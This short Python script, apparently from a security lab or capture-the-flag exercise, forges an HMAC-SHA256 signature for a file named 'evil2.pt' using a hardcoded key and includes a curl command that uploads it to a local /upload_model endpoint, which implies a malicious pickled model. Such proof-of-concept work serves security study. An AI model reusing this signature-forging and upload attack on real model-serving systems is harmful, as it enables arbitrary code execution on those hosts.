# Real Attack scenario 2
# generate a sig with the HMAC key

import hmac, hashlib
KEY = "pickle_tickle".encode()  
data = open("evil2.pt","rb").read()
print(hmac.new(KEY, data, hashlib.sha256).hexdigest())

'''
How to Attack in Local :
curl -s -X POST http://localhost:916/upload_model \
  -F "file=@evil2.pt" \
  -F "sig=cbe1f9c52f21dd78ed6775553191f22c3087d46a7a5bcdc3613f9de14bff7e48"
'''